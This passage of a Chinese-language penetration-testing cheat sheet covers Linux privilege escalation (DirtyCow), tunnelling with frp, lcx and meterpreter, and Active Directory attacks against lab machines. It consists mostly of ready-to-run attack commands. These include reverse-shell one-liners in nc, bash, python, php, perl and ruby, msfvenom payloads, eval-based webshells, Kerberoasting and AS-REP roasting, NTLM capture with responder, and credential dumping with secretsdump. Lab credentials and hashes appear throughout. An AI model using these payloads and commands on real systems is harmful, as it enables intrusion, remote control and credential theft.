href="#exp提权"></a> EXP提权</h3><ul><li><a href="https://github.com/initstring/dirty_sock">CVE-2019-7304</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 18.10</span><br><span class="line">Ubuntu 18.04 LTS</span><br><span class="line">Ubuntu 16.04 LTS</span><br><span class="line">Ubuntu 14.04 LTS</span><br><span class="line">2.28 &lt; snapd &lt; 2.37</span><br><span class="line">网络连通</span><br></pre></td></tr></table></figure><ul><li>DirtyCow</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io</span><br><span class="line">cd dirtycow.github.io</span><br><span class="line">gcc dirtyc0w.c -o dirtycow -pthread</span><br><span class="line">.&#x2F;dirtycow &#x2F;etc&#x2F;group “$(sed ‘&#x2F;\(sudo*\)&#x2F; s&#x2F;$&#x2F;,test&#x2F;’ &#x2F;etc&#x2F;group)”</span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure><ul><li>40616.c</li></ul><h3 id="文件传输"><a class="markdownIt-Anchor" href="#文件传输"></a> 文件传输</h3><ul><li>FTP</li><li>SCP</li><li>HTTP<ul><li><code>python2 -m SimpleHTTPServer 80 &amp;</code></li><li><code>python3 -m http.server 80&amp;</code></li></ul></li></ul><h3 id="内网代理"><a class="markdownIt-Anchor" href="#内网代理"></a> 内网代理</h3><ul><li>meterpreter(socks4)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f elf &gt; shell.elf</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br></pre></td></tr></table></figure><ul><li><p>portfwd -l 2222 -p 8080 -r 127.0.0.1 (本地服务端口转发/netstat)</p></li><li><p>earthworm(socks5)</p></li><li><p>访问本地服务</p></li><li><p>ngork</p><ul><li><p><a href="https://ngrok.com/">https://ngrok.com/</a></p></li><li><p><a href="https://www.tunnelnat.com/">https://www.tunnelnat.com/</a></p></li></ul></li><li><p>reGeorg</p></li><li><p>frp</p><ul><li><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.56.104</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[sock5_1]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 45555</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; user</span><br><span class="line">plugin_passwd &#x3D; pass</span><br><span class="line">#####################</span><br><span class="line">#frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line">dashboard_user &#x3D; admin</span><br><span class="line">dashboard_pass &#x3D; admin</span><br></pre></td></tr></table></figure><ul><li>nps<ul><li><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></li></ul></li><li>lcx</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lcx配合meterpreter进行公网反弹Shell</span><br><span class="line">Server上执行lcx -listen 8888 9999</span><br><span class="line">本地执行lcx -slave Server 8888 Local_IP 7777</span><br><span class="line">并在MSF监听Local_IP上的7777端口</span><br><span class="line">(注意这里不能用127.0.0.1) </span><br><span class="line">目标机器上meterpreter反弹至Server的8888端口</span><br></pre></td></tr></table></figure><ul><li>proxychain</li><li>proxifier</li><li>sockscap</li><li>socat<ul><li><code>socat tcp-listen:1234,fork tcp-connect:localhost:8080</code></li></ul></li><li>plink<ul><li><code>plink.exe -ssh root@192.168.0.1 -pw password -R 1234:127.0.0.1:3306</code></li></ul></li></ul><h4 id="shell-2"><a class="markdownIt-Anchor" href="#shell-2"></a> Shell</h4><ul><li>nc</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc.traditional是最早的版本(v1.10-41.1)，该版本具有&#96;&#96;-e&#96;&#96;的选项，用于反弹shell十分方便</span><br><span class="line">ubuntu中的nc命令则会指向netcat-openbsd，而该版本则没有&#96;&#96;-e&#96;&#96;的选项，无法用于反弹shell</span><br><span class="line">ncat的版本则比较新，集成于nmap中</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">正向Shell</span></span><br><span class="line">nc -lvvp 8080 -t -e /bin/bash</span><br><span class="line">.............................</span><br><span class="line">nc 192.168.0.0 8000</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i 2&gt;&amp;1 | nc 192.168.0.1 8080</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.0.1 8080 &gt;/tmp/f</span><br><span class="line">nc -e /bin/bash 192.168.0.1 8080</span><br><span class="line">.............................</span><br><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><ul><li>bash</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1</span><br><span class="line">.............................</span><br><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><ul><li>python</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.0.1&#x27;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure><ul><li>php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1&quot;)&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>perl</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>ruby</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;192.168.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="powershell"><a class="markdownIt-Anchor" href="#powershell"></a> PowerShell</h3><ul><li>命令多条分隔/命令注入: ;</li><li>Secure String</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$password &#x3D; ConvertTo-SecureString &#39;P@ssw0rd&#39; -AsPlainText -Force</span><br><span class="line">$Ptr &#x3D; [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)</span><br><span class="line">$result &#x3D; [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)</span><br><span class="line">$result </span><br></pre></td></tr></table></figure><hr /><h1 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><ul><li>nmap</li><li>dirb</li><li>wfuzz<ul><li>VHOST: <code>wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://flight.htb&quot; -H &quot;Host: FUZZ.flight.htb&quot; --hl 154</code></li></ul></li><li>enum4linux<ul><li><code>enum4linux 10.10.10.248</code></li></ul></li><li>smbmap<ul><li><code>smbmap -H 10.10.10.248 -u &quot;test&quot;</code></li><li><code>smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence</code></li></ul></li><li>smbclient<ul><li><code>smbclient //10.10.10.248/users -U Tiffany.Molina --password='NewIntelligenceCorpUser9876'</code></li><li>下载路径</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mask &quot;&quot;</span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget active.htb</span><br></pre></td></tr></table></figure><ul><li>kerbrute</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum -dc-ip 10.10.10.248 -d intelligence.htb users</span><br></pre></td></tr></table></figure><ul><li>bloodhound</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d megacorp.local -u sandra -p <span class="string">&quot;Password1234!&quot;</span> -gc pathfinder.megacorp.local -c all -ns 10.10.10.30</span><br><span class="line">neo4j console</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -O</span><br><span class="line">curl https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -O</span><br><span class="line">invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</span><br></pre></td></tr></table></figure><ul><li>lookupsid</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py sql_svc:REGGIE1234ronnie@10.10.11.202</span><br></pre></td></tr></table></figure><ul><li>pywerview</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-data</span><br></pre></td></tr></table></figure><ul><li>procdump</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./procdump64.exe -accepteula -ma 6216</span><br></pre></td></tr></table></figure><ul><li>crackmapexec<ul><li>username: <code>crackmapexec smb 10.10.11.187 -d flight -u svc_apache -p 'S@Ss!K@*t13' --users</code></li></ul></li></ul><h2 id="爆破"><a class="markdownIt-Anchor" href="#爆破"></a> 爆破</h2><ul><li>爆破smb<ul><li><code>crackmapexec smb 10.10.10.248 -d intelligence -u user -p NewIntelligenceCorpUser9876 --continue-on-success</code></li></ul></li><li>爆破winrm<ul><li><code>crackmapexec winrm 10.10.10.149 -d heist -u user -p pass</code></li></ul></li></ul><h2 id="获取凭证"><a class="markdownIt-Anchor" href="#获取凭证"></a> 获取凭证</h2><h3 id="gmsadumper"><a class="markdownIt-Anchor" href="#gmsadumper"></a> gMSADumper</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py</span><br><span class="line">python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248</span><br></pre></td></tr></table></figure><h3 id="allowed_to_delegate_to"><a class="markdownIt-Anchor" href="#allowed_to_delegate_to"></a> allowed_to_delegate_to</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-data</span><br><span class="line">python3 getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :47e89a6afd68e3872ef1acaf91d0b2f7 -impersonate administrator</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 secretsdump.py -k dc.intelligence.htb -just-dc</span><br></pre></td></tr></table></figure><h3 id="gpp"><a class="markdownIt-Anchor" href="#gpp"></a> GPP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</span><br></pre></td></tr></table></figure><h3 id="mimikatz"><a class="markdownIt-Anchor" href="#mimikatz"></a> mimikatz</h3><h3 id="kerberoasting"><a class="markdownIt-Anchor" href="#kerberoasting"></a> kerberoasting</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mi>G</mi><mi>S</mi><mi mathvariant="normal">_</mi><mi>T</mi><mi>i</mi><mi>c</mi><mi>k</mi><mi>e</mi><mi>t</mi><mo>=</mo><mi>R</mi><mi>C</mi><mn>4</mn><mo>−</mo><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>P</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mo>=</mo><mi>T</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi>a</mi><mi>m</mi><mi>p</mi><mo separator="true">,</mo><mi>K</mi><mi>e</mi><mi>y</mi><mo>=</mo><mi>S</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>T</mi><mi>L</mi><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TGS\_Ticket = RC4-HMAC(Plain = Timestamp, Key = Server\_NTLM)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">G</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span><br />Plain格式固定且已知，枚举Key解密TGS_Tikect，格式匹配即得到Server_NTLM</p><ul><li>一般用于攻击用户账号的SPN</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile getuserspns.out</span><br><span class="line">hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><h3 id="as-rep-roasting"><a class="markdownIt-Anchor" href="#as-rep-roasting"></a> AS-REP Roasting</h3><blockquote><p>Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.<br /><a href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting">https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting</a></p></blockquote><ul><li>Username requiured</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py HTB/svc-alfresco -request -no-pass -dc-ip 10.10.10.161</span><br><span class="line">hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><h3 id="获取运行程序-服务用户凭证"><a class="markdownIt-Anchor" href="#获取运行程序-服务用户凭证"></a> 获取运行程序、服务用户凭证</h3><p>监听</p><ul><li>responder</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0 -A</span><br></pre></td></tr></table></figure><ul><li>smbserver</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py -ip 10.10.*.* -smb2support BFL &#x2F;tmp</span><br></pre></td></tr></table></figure><p>服务</p><ul><li>Invoke-WebRequest</li></ul><p>访问域中web*域名80端口</p><figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Check web server status. Scheduled to run every 5min</span></span><br><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$record</span> <span class="keyword">in</span> <span class="built_in">Get-ChildItem</span> <span class="string">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> | <span class="built_in">Where-Object</span> Name <span class="operator">-like</span> <span class="string">&quot;web*&quot;</span>)  &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$request</span> = <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://<span class="variable">$</span>(<span class="variable">$record</span>.Name)&quot;</span> <span class="literal">-UseDefaultCredentials</span></span><br><span class="line">        <span class="keyword">if</span>(.StatusCode <span class="operator">-ne</span> <span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Send-MailMessage</span> <span class="literal">-From</span> <span class="string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="literal">-To</span> <span class="string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="literal">-Subject</span> <span class="string">&quot;Host: <span class="variable">$</span>(<span class="variable">$record</span>.Name) is down&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">        <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;dirkjanm&#x2F;krbrelayx&#x2F;master&#x2F;dnstool.py</span><br><span class="line">python3 dnstool.py -u &quot;intelligence.htb\Tiffany.Molina&quot; -p NewIntelligenceCorpUser9876 --action add -r webbufferfly.intelligence.htb -d 10.10.*.* 10.10.10.248</span><br></pre></td></tr></table></figure><ul><li>MSSQL</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py PublicUser:GuestUserCantWrite1@10.10.11.202</span><br><span class="line"><span class="built_in">exec</span> master.dbo.xp_dirtree <span class="string">&#x27;\\10.10.*.*\BFL&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>RFI</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// [2] include(/header.inc): failed to open stream: No such file or directory On line 36 in file C:\inetpub\wwwroot\functions.php</span></span><br><span class="line">    <span class="comment">// Following function securely includes a file. Whenever we </span></span><br><span class="line">    <span class="comment">// will encounter a PHP tag we will just bail out here. </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">secure_include</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file</span>);                <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            http_response_code(<span class="number">403</span>); </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Forbidden - Tampering attempt detected.&#x27;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=//10.10.*.*&amp;h=b1a3d9ecf02d4854f3a730f8b2a9af5d</span><br></pre></td></tr></table></figure><p>爆破NTLMv2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><h2 id="getshell"><a class="markdownIt-Anchor" href="#getshell"></a> GetShell</h2><ul><li>psexec<ul><li>路径写权限</li></ul></li><li>evil-winrm</li><li>ssh</li><li>mssql</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py ARCHETYPE&#x2F;sql_svc@10.10.10.27  -windows-auth</span><br><span class="line">enable_xp_cmdshell</span><br><span class="line">xp_cmdshell whoami</span><br></pre></td></tr></table></figure><ul><li>wmiexec</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb</span><br></pre></td></tr></table></figure><ul><li>WebShell<ul><li>PHP: <code>&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;</code></li><li>ASP: <code>&lt;%eval request(&quot;BFL&quot;)%&gt;</code></li><li>ASPX: <code>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;BFL&quot;],”unsafe”);%&gt;</code></li><li>JSP: <code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;BFL&quot;));%&gt;</code></li></ul></li></ul><h2 id="路径"><a class="markdownIt-Anchor" href="#路径"></a> 路径</h2><ul><li>powershell history: <code>&quot;c:\users\$user\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt&quot;</code></li><li>redif conf: <code>&quot;c:\program files\redis\redis.windows.conf&quot;</code></li><li>mssql conf: <code>&quot;c:\program files\microsoft sql server\&quot;</code></li><li>SAM &amp; SYSTEM: <code>c:\windows\system32\config\system</code> <code>c:\windows\system32\config\sam</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py <span class="built_in">local</span> -system /tmp/SYSTEM -sam /tmp/SAM</span><br></pre></td></tr></table></figure><ul><li>mRemoteNG: <code>c:\users\$user\appdata\roaming\mremoteng\confcons.xml</code></li></ul><h2 id="文件传输-2"><a class="markdownIt-Anchor" href="#文件传输-2"></a> 文件传输</h2><ul><li>Server<ul><li>smb</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py Bufferfly . -smb2support -username Buffer -password fly &amp;</span><br></pre></td></tr></table></figure><ul><li>http</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 